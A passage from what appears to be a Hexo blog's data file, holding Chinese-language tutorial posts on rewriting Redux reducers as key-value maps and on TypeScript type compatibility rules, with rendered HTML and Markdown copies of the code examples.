class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> &#123;xxx, yyy&#125; <span class=\"keyword\">from</span> <span class=\"string\">'constants'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> initialState = &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// reducer</span></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">const</span> Model = <span class=\"function\">(<span class=\"params\">state = initialState, action</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">switch</span>(action.type) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> xxx: </span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"comment\">//...</span></span><br><span class=\"line\">        <span class=\"keyword\">case</span> yyy:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"comment\">//...</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">default</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> state;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>上面的这种写法并不能说是错，因为官方给出的例子就是这么介绍的。但是就好比 <code>javascript loop</code> 一样，大家都在用 <code>forEach</code>、<code>for-of</code>了，而我们还是在使用 <code>for</code> 循环。而且 <code>switch-case</code> 就如同循环一般，如果找不到匹配项就会一直向下查找，性能方面不是特别好(我真不想说这句话)。</p>\n<h3 id=\"重写-reducer\"><a href=\"#重写-reducer\" class=\"headerlink\" title=\"重写 reducer\"></a>重写 <code>reducer</code></h3><p>简单的说，<code>reducer</code> 是为了接收一个 <code>action.type</code> 并对数据进行相应的处理，然后返回。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">reducer</span> (<span class=\"params\">state = initialState, action</span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// 处理 action，返回 &#123;&#125;</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>我们可以将 <code>action.type</code> 更 <code>reducer</code> 合并：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">reducer</span> (<span class=\"params\">state = initialState, action</span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> (</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            [action.type]: <span class=\"function\">(<span class=\"params\">state, action</span>) =&gt;</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    )</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"现在-reducer-还是接收-action-type-然后触发相应的数据处理函数。只不过从-switch-case-变成了-key-value-取值的形式。\"><a href=\"#现在-reducer-还是接收-action-type-然后触发相应的数据处理函数。只不过从-switch-case-变成了-key-value-取值的形式。\" class=\"headerlink\" title=\"现在 reducer 还是接收 action.type 然后触发相应的数据处理函数。只不过从 switch-case 变成了 key-value 取值的形式。\"></a>现在 <code>reducer</code> 还是接收 <code>action.type</code> 然后触发相应的数据处理函数。只不过从 <code>switch-case</code> 变成了 <code>key-value</code> 取值的形式。</h2><p>最终，我们对上面的代码进行优化：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// createReducer</span></span><br><span class=\"line\"><span class=\"keyword\">export</span>  <span class=\"keyword\">default</span> <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">initialState, reducerMap</span>) </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"function\">(<span class=\"params\">state = initialState, action</span>) =&gt;</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">const</span> reducer = reducerMap[action.type];</span><br><span class=\"line\">        <span class=\"keyword\">return</span> reducer ? reducer(state, action) : state;</span><br><span class=\"line\">    </span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>上面的最终版还是有一点问题，这里我再优化了，留给有心的人去解决。</p>\n","site":{"data":{}},"excerpt":"<p>本文介绍如何摆脱 <code>switch-case</code>，以一种更方便的形式接收 <code>action</code> 的通知。<br>","more":"</p>\n<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p><code>redux</code> 是 <code>react</code> 数据管理的一个解决方案，其原理借鉴了 <code>flux</code> 架构。<code>redux</code> 中一共由三个核心部分构成–<code>store</code>、<code>reducer</code>、<code>action</code>，其中 <code>reducer</code> 则是负责接收 <code>action</code> 的消息，然后对数据部分进行处理。官方对于 <code>reducer</code> 的描述为一个简单的 <code>switch-case</code> 结构。下面会介绍 <code>reducer</code> 以一种 <code>key-value</code> 的形式接收 <code>action</code>。</p>\n<h3 id=\"旧版-switch-case-写法\"><a href=\"#旧版-switch-case-写法\" class=\"headerlink\" title=\"旧版 switch-case 写法\"></a>旧版 <code>switch-case</code> 写法</h3><p>下面是伪代码：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> &#123;xxx&#125; <span class=\"keyword\">from</span> <span class=\"string\">'constants'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// action</span></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">const</span> actionHandler = <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> &#123;</span><br><span class=\"line\">        type: xxx,</span><br><span class=\"line\">        <span class=\"comment\">//...</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> &#123;xxx, yyy&#125; <span class=\"keyword\">from</span> <span class=\"string\">'constants'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> initialState = &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// reducer</span></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">const</span> Model = <span class=\"function\">(<span class=\"params\">state = initialState, action</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">switch</span>(action.type) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> xxx: </span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"comment\">//...</span></span><br><span class=\"line\">        <span class=\"keyword\">case</span> yyy:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"comment\">//...</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">default</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> state;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>上面的这种写法并不能说是错，因为官方给出的例子就是这么介绍的。但是就好比 <code>javascript loop</code> 一样，大家都在用 <code>forEach</code>、<code>for-of</code>了，而我们还是在使用 <code>for</code> 循环。而且 <code>switch-case</code> 就如同循环一般，如果找不到匹配项就会一直向下查找，性能方面不是特别好(我真不想说这句话)。</p>\n<h3 id=\"重写-reducer\"><a href=\"#重写-reducer\" class=\"headerlink\" title=\"重写 reducer\"></a>重写 <code>reducer</code></h3><p>简单的说，<code>reducer</code> 是为了接收一个 <code>action.type</code> 并对数据进行相应的处理，然后返回。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">reducer</span> (<span class=\"params\">state = initialState, action</span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// 处理 action，返回 &#123;&#125;</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>我们可以将 <code>action.type</code> 更 <code>reducer</code> 合并：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">reducer</span> (<span class=\"params\">state = initialState, action</span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> (</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            [action.type]: <span class=\"function\">(<span class=\"params\">state, action</span>) =&gt;</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    )</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"现在-reducer-还是接收-action-type-然后触发相应的数据处理函数。只不过从-switch-case-变成了-key-value-取值的形式。\"><a href=\"#现在-reducer-还是接收-action-type-然后触发相应的数据处理函数。只不过从-switch-case-变成了-key-value-取值的形式。\" class=\"headerlink\" title=\"现在 reducer 还是接收 action.type 然后触发相应的数据处理函数。只不过从 switch-case 变成了 key-value 取值的形式。\"></a>现在 <code>reducer</code> 还是接收 <code>action.type</code> 然后触发相应的数据处理函数。只不过从 <code>switch-case</code> 变成了 <code>key-value</code> 取值的形式。</h2><p>最终，我们对上面的代码进行优化：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// createReducer</span></span><br><span class=\"line\"><span class=\"keyword\">export</span>  <span class=\"keyword\">default</span> <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">initialState, reducerMap</span>) </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"function\">(<span class=\"params\">state = initialState, action</span>) =&gt;</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">const</span> reducer = reducerMap[action.type];</span><br><span class=\"line\">        <span class=\"keyword\">return</span> reducer ? reducer(state, action) : state;</span><br><span class=\"line\">    </span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>上面的最终版还是有一点问题，这里我再优化了，留给有心的人去解决。</p>"},{"title":"Typescript学习日记(七)","date":"2017-02-12T06:23:14.000Z","_content":"\n本文主要介绍 `typescript` 各个类型的兼容性。\n<!-- more -->\n\n### 类型兼容性\n\nTypeScript里的类型兼容性是基于结构子类型的。 结构类型是一种只使用其成员来描述类型的方式。 它正好与名义（nominal）类型形成对比。\n**如果不了解，请忽略上面这段话**。\n\n#### 比较两个变量\n\n这里直接使用官方的例子：\n\n```ts\ninterface Named {\n    name: string;\n}\n\nlet x: Named;\nlet y = { name: 'Alice', location: 'Seattle' }; // y 的类型推断为 {name: string, location: string}\nx = y; // -> success，x 中拥有一个 name: string 类型， 符合 y 中 name 的数据类型；location 则继续沿用 y 的。\ny = x; // -> error，x 中的 name 属性类型符合 y 中 name 属性，但 x 缺少 location 属性，无法赋值给 y\n```\n\n**总结**：\n赋值对象(y)中包含被赋值对象(x)的属性类型，且被赋值对象(x)中的属性在赋值对象(y)中存在，则可以正常成功进行赋值。\n\n#### 比较两个函数\n\n比较两个函数和比较变量的比较方式大致一致；比较函数时，比较的是 `函数的参数` 和 `函数的返回值` ，且比较规则于比较变量规则相同。\n\n```ts\n// 比较参数\nlet x = (a: number) => 0;\nlet y = (b: number, s: string) => 0;\n\ny = x; // -> success 同上\nx = y; // -> error 同上\n```\n\n```ts\n// 比较返回值\nlet x = () => ({name: 'Alice'});\nlet y = () => ({name: 'Alice', location: 'Seattle'});\n\nx = y; // -> success 同上\ny = x; // -> error 同上\n```\n\n可以看出，两个函数比较的时候比较的仅仅是 `函数参数` 和 `函数返回值`，比较的规则依然沿用 `比较变量` 的结论。\n\n\n#### 函数参数双向协变\n\n这里直接引用官方的说法。\n当比较函数参数类型时，只有当源函数参数能够赋值给目标函数或者反过来时才能赋值成功。 这是不稳定的，因为调用者可能传入了一个具有更精确类型信息的函数，但是调用这个传入的函数的时候却使用了**不是那么精确的类型信息**。 \n实际上，这极少会发生错误，并且能够实现很多 `JavaScript` 里的常见模式。\n\n```ts\nenum EventType { Mouse, Keyboard }\n\ninterface Event { timestamp: number; }\ninterface MouseEvent extends Event { x: number; y: number }\ninterface KeyEvent extends Event { keyCode: number }\n\nfunction listenEvent(eventType: EventType, handler: (n: Event) => void) {\n    /* ... */\n}\n\n// 常见的使用方式\n// e: MouseEvent => {x: number; y: number; timestamp: number;}\nlistenEvent(EventType.Mouse, (e: MouseEvent) => console.log(e.x + ',' + e.y));\n\n// 并不是一个很好的代替品\n// e: Event => { timestamp: number; }\nlistenEvent(EventType.Mouse, (e: Event) => console.log((<MouseEvent>e).x + ',' + (<MouseEvent>e).y));\nlistenEvent(EventType.Mouse, <(e: Event) => void>((e: MouseEvent) => console.log(e.x + ',' + e.y)));\n\n// 这也不是很好\n// e: number\nlistenEvent(EventType.Mouse, (e: number) => console.log(e));\n```\n\n\n#### 可选参数及剩余参数\n\n这里直接引用官方的说法。\n比较函数兼容性的时候，可选参数与必须参数是可互换的。 **源类型上有额外的可选参数不是错误，目标类型的可选参数在源类型里没有对应的参数也不是错误**。\n当一个函数有剩余参数时，它被当做 `无限个可选参数`。\n这对于类型系统来说是不稳定的，但从运行时的角度来看，可选参数一般来说是不强制的，因为对于大多数函数来说相当于传递了一些  `undefinded`。\n\n```ts\nfunction invokeLater(args: any[], callback: (...args: any[]) => void) {\n    /* ... Invoke callback with 'args' ... */\n}\n\n// Unsound - invokeLater \"might\" provide any number of arguments\ninvokeLater([1, 2], (x, y) => console.log(x + ', ' + y));\n\n// Confusing (x and y are actually required) and undiscoverable\ninvokeLater([1, 2], (x?, y?) => console.log(x + ', ' + y));\n```\n\n#### 函数重载\n\n官方文档上的说明很好理解：\n对于有重载的函数，源函数的每个重载都要在目标函数上找到对应的函数签名。 这确保了目标函数可以在所有源函数可调用的地方调用。\n\n\n### 枚举\n\n枚举类型与数字类型兼容，并且数字类型与枚举类型兼容。不同枚举类型之间是不兼容的。\n\n```ts\nenum Status { Ready, Waiting };\nenum Color { Red, Blue, Green };\n\nlet status = Status.Ready;\nstatus = Color.Red; // -> error, 不同枚举类型\n```\n\n### 类\n\n类与对象字面量和接口差不多，但有一点不同：**类有静态部分和实例部分的类型**。 比较两个类类型的对象时，只有 `实例的成员会被比较`，`静态成员` 和 `构造函数` 不在比较的范围内。\n\n```ts\nclass Animal {\n    feet: number;\n    constructor(name: string, numFeet: number) { }\n}\n\nclass Size {\n    feet: number;\n    constructor(numFeet: number) { }\n}\n\nlet a: Animal;\nlet s: Size;\n\na = s;  // -> success，如果比较构造函数，这里就会抛出错误\ns = a;  // -> success\n```\n\n#### 私有成员\n私有成员会影响兼容性判断。 当类的实例用来检查兼容时，如果目标类型包含一个私有成员，那么**源类型必须包含来自同一个类的这个私有成员**。 这允许子类赋值给父类，但是不能赋值给其它有同样类型的类。\n\n\n#### 泛型\n\n因为 `TypeScript` 是结构性的类型系统，类型参数只影响使用其做为类型一部分的结果类型。\n\n\n```ts\ninterface Empty<T> {\n}\nlet x: Empty<number>;\nlet y: Empty<string>;\n\nx = y;  // success, x 与 y 互相兼容，并不排斥\n```\n\n```ts\ninterface NotEmpty<T> {\n    data: T;\n}\nlet x: NotEmpty<number>;\nlet y: NotEmpty<string>;\n\nx = y;  // error, x 为 number 时，date 为 number；y 为 string 时，date 为 string。x、y不兼容。\n```\n\n对于没指定泛型类型的泛型参数时，会把所有泛型参数当成 `any` 比较。\n如下：\n\n```ts\nlet identity = function<T>(x: T): T {\n    // ...\n}\n\nlet reverse = function<U>(y: U): U {\n    // ...\n}\n\nidentity = reverse;  // Okay because (x: any)=>any matches (y: any)=>any\n```\n\n### 总结\n在 `TypeScript` 里，有两种类型的兼容性：子类型与赋值。 \n它们的不同点在于，赋值扩展了子类型兼容，允许给 `any` 赋值或从 `any` 取值和允许数字赋值给枚举类型或枚举类型赋值给数字。","source":"_posts/Typescript学习日记（七）.md","raw":"---\ntitle: Typescript学习日记(七)\ndate: 2017-02-12 14:23:14\ntags:\n---\n\n本文主要介绍 `typescript` 各个类型的兼容性。\n<!-- more -->\n\n### 类型兼容性\n\nTypeScript里的类型兼容性是基于结构子类型的。 结构类型是一种只使用其成员来描述类型的方式。 它正好与名义（nominal）类型形成对比。\n**如果不了解，请忽略上面这段话**。\n\n#### 比较两个变量\n\n这里直接使用官方的例子：\n\n```ts\ninterface Named {\n    name: string;\n}\n\nlet x: Named;\nlet y = { name: 'Alice', location: 'Seattle' }; // y 的类型推断为 {name: string, location: string}\nx = y; // -> success，x 中拥有一个 name: string 类型， 符合 y 中 name 的数据类型；location 则继续沿用 y 的。\ny = x; // -> error，x 中的 name 属性类型符合 y 中 name 属性，但 x 缺少 location 属性，无法赋值给 y\n```\n\n**总结**：\n赋值对象(y)中包含被赋值对象(x)的属性类型，且被赋值对象(x)中的属性在赋值对象(y)中存在，则可以正常成功进行赋值。\n\n#### 比较两个函数\n\n比较两个函数和比较变量的比较方式大致一致；比较函数时，比较的是 `函数的参数` 和 `函数的返回值` ，且比较规则于比较变量规则相同。\n\n```ts\n// 比较参数\nlet x = (a: number) => 0;\nlet y = (b: number, s: string) => 0;\n\ny = x; // -> success 同上\nx = y; // -> error 同上\n```\n\n```ts\n// 比较返回值\nlet x = () => ({name: 'Alice'});\nlet y = () => ({name: 'Alice', location: 'Seattle'});\n\nx = y; // -> success 同上\ny = x; // -> error 同上\n```\n\n可以看出，两个函数比较的时候比较的仅仅是 `函数参数` 和 `函数返回值`，比较的规则依然沿用 `比较变量` 的结论。\n\n\n#### 函数参数双向协变\n\n这里直接引用官方的说法。\n当比较函数参数类型时，只有当源函数参数能够赋值给目标函数或者反过来时才能赋值成功。 这是不稳定的，因为调用者可能传入了一个具有更精确类型信息的函数，但是调用这个传入的函数的时候却使用了**不是那么精确的类型信息**。 \n实际上，这极少会发生错误，并且能够实现很多 `JavaScript` 里的常见模式。\n\n```ts\nenum EventType { Mouse, Keyboard }\n\ninterface Event { timestamp: number; }\ninterface MouseEvent extends Event { x: number; y: number }\ninterface KeyEvent extends Event { keyCode: number }\n\nfunction listenEvent(eventType: EventType, handler: (n: Event) => void) {\n    /* ... */\n}\n\n// 常见的使用方式\n// e: MouseEvent => {x: number; y: number; timestamp: number;}\nlistenEvent(EventType.Mouse, (e: MouseEvent) => console.log(e.x + ',' + e.y));\n\n// 并不是一个很好的代替品\n// e: Event => { timestamp: number; }\nlistenEvent(EventType.Mouse, (e: Event) => console.log((<MouseEvent>e).x + ',' + (<MouseEvent>e).y));\nlistenEvent(EventType.Mouse, <(e: Event) => void>((e: MouseEvent) => console.log(e.x + ',' + e.y)));\n\n// 这也不是很好\n// e: number\nlistenEvent(EventType.Mouse, (e: number) => console.log(e));\n```\n\n\n#### 可选参数及剩余参数\n\n这里直接引用官方的说法。\n比较函数兼容性的时候，可选参数与必须参数是可互换的。 **源类型上有额外的可选参数不是错误，目标类型的可选参数在源类型里没有对应的参数也不是错误**。\n当一个函数有剩余参数时，它被当做 `无限个可选参数`。\n这对于类型系统来说是不稳定的，但从运行时的角度来看，可选参数一般来说是不强制的，因为对于大多数函数来说相当于传递了一些  `undefinded`。\n\n```ts\nfunction invokeLater(args: any[], callback: (...args: any[]) => void) {\n    /* ... Invoke callback with 'args' ... */\n}\n\n// Unsound - invokeLater \"might\" provide any number of arguments\ninvokeLater([1, 2], (x, y) => console.log(x + ', ' + y));\n\n// Confusing (x and y are actually required) and undiscoverable\ninvokeLater([1, 2], (x?, y?) => console.log(x + ', ' + y));\n```\n\n#### 函数重载\n\n官方文档上的说明很好理解：\n对于有重载的函数，源函数的每个重载都要在目标函数上找到对应的函数签名。 这确保了目标函数可以在所有源函数可调用的地方调用。\n\n\n### 枚举\n\n枚举类型与数字类型兼容，并且数字类型与枚举类型兼容。不同枚举类型之间是不兼容的。\n\n```ts\nenum Status { Ready, Waiting };\nenum Color { Red, Blue, Green };\n\nlet status = Status.Ready;\nstatus = Color.Red; // -> error, 不同枚举类型\n```\n\n### 类\n\n类与对象字面量和接口差不多，但有一点不同：**类有静态部分和实例部分的类型**。 比较两个类类型的对象时，只有 `实例的成员会被比较`，`静态成员` 和 `构造函数` 不在比较的范围内。\n\n```ts\nclass Animal {\n    feet: number;\n    constructor(name: string, numFeet: number) { }\n}\n\nclass Size {\n    feet: number;\n    constructor(numFeet: number) { }\n}\n\nlet a: Animal;\nlet s: Size;\n\na = s;  // -> success，如果比较构造函数，这里就会抛出错误\ns = a;  // -> success\n```\n\n#### 私有成员\n私有成员会影响兼容性判断。 当类的实例用来检查兼容时，如果目标类型包含一个私有成员，那么**源类型必须包含来自同一个类的这个私有成员**。 这允许子类赋值给父类，但是不能赋值给其它有同样类型的类。\n\n\n#### 泛型\n\n因为 `TypeScript` 是结构性的类型系统，类型参数只影响使用其做为类型一部分的结果类型。\n\n\n```ts\ninterface Empty<T> {\n}\nlet x: Empty<number>;\nlet y: Empty<string>;\n\nx = y;  // success, x 与 y 互相兼容，并不排斥\n```\n\n```ts\ninterface NotEmpty<T> {\n    data: T;\n}\nlet x: NotEmpty<number>;\nlet y: NotEmpty<string>;\n\nx = y;  // error, x 为 number 时，date 为 number；y 为 string 时，date 为 string。x、y不兼容。\n```\n\n对于没指定泛型类型的泛型参数时，会把所有泛型参数当成 `any` 比较。\n如下：\n\n```ts\nlet identity = function<T>(x: T): T {\n    // ...\n}\n\nlet reverse = function<U>(y: U): U {\n    // ...\n}\n\nidentity = reverse;  // Okay because (x: any)=>any matches (y: any)=>any\n```\n\n### 总结\n在 `TypeScript` 里，有两种类型的兼容性：子类型与赋值。 \n它们的不同点在于，赋值扩展了子类型兼容，允许给 `any` 赋值或从 `any` 取值和允许数字赋值给枚举类型或枚举类型赋值给数字。","slug":"Typescript学习日记（七）","published":1,"updated":"2018-10-25T06:05:58.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjno6s7qg000502vsflsi5qaa","content":"<p>本文主要介绍 <code>typescript</code> 各个类型的兼容性。<br><a id=\"more\"></a></p>\n<h3 id=\"类型兼容性\"><a href=\"#类型兼容性\" class=\"headerlink\" title=\"类型兼容性\"></a>类型兼容性</h3><p>TypeScript里的类型兼容性是基于结构子类型的。 结构类型是一种只使用其成员来描述类型的方式。 它正好与名义（nominal）类型形成对比。<br><strong>如果不了解，请忽略上面这段话</strong>。</p>\n<h4 id=\"比较两个变量\"><a href=\"#比较两个变量\" class=\"headerlink\" title=\"比较两个变量\"></a>比较两个变量</h4><p>这里直接使用官方的例子：</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">interface</span> Named &#123;</span><br><span class=\"line\">    name: <span class=\"built_in\">string</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> x: Named;</span><br><span class=\"line\"><span class=\"keyword\">let</span> y = &#123; name: <span class=\"string\">'Alice'</span>, location: <span class=\"string\">'Seattle'</span> &#125;; <span class=\"comment\">// y 的类型推断为 &#123;name: string, location: string&#125;</span></span><br><span class=\"line\">x = y; <span class=\"comment\">// -&gt; success，x 中拥有一个 name: string 类型， 符合 y 中 name 的数据类型；location 则继续沿用 y 的。</span></span><br><span class=\"line\">y = x; <span class=\"comment\">// -&gt; error，x 中的 name 属性类型符合 y 中 name 属性，但 x 缺少 location 属性，无法赋值给 y</span></span><br></pre></td></tr></table></figure>\n<p><strong>总结</strong>：<br>赋值对象(y)中包含被赋值对象(x)的属性类型，且被赋值对象(x)中的属性在赋值对象(y)中存在，则可以正常成功进行赋值。</p>\n<h4 id=\"比较两个函数\"><a href=\"#比较两个函数\" class=\"headerlink\" title=\"比较两个函数\"></a>比较两个函数</h4><p>比较两个函数和比较变量的比较方式大致一致；比较函数时，比较的是 <code>函数的参数</code> 和 <code>函数的返回值</code> ，且比较规则于比较变量规则相同。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 比较参数</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> x = <span class=\"function\">(<span class=\"params\">a: <span class=\"built_in\">number</span></span>) =&gt;</span> <span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"keyword\">let</span> y = <span class=\"function\">(<span class=\"params\">b: <span class=\"built_in\">number</span>, s: <span class=\"built_in\">string</span></span>) =&gt;</span> <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">y = x; <span class=\"comment\">// -&gt; success 同上</span></span><br><span class=\"line\">x = y; <span class=\"comment\">// -&gt; error 同上</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 比较返回值</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> x = <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> (&#123;name: <span class=\"string\">'Alice'</span>&#125;);</span><br><span class=\"line\"><span class=\"keyword\">let</span> y = <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> (&#123;name: <span class=\"string\">'Alice'</span>, location: <span class=\"string\">'Seattle'</span>&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">x = y; <span class=\"comment\">// -&gt; success 同上</span></span><br><span class=\"line\">y = x; <span class=\"comment\">// -&gt; error 同上</span></span><br></pre></td></tr></table></figure>\n<p>可以看出，两个函数比较的时候比较的仅仅是 <code>函数参数</code> 和 <code>函数返回值</code>，比较的规则依然沿用 <code>比较变量</code> 的结论。</p>\n<h4 id=\"函数参数双向协变\"><a href=\"#函数参数双向协变\" class=\"headerlink\" title=\"函数参数双向协变\"></a>函数参数双向协变</h4><p>这里直接引用官方的说法。<br>当比较函数参数类型时，只有当源函数参数能够赋值给目标函数或者反过来时才能赋值成功。 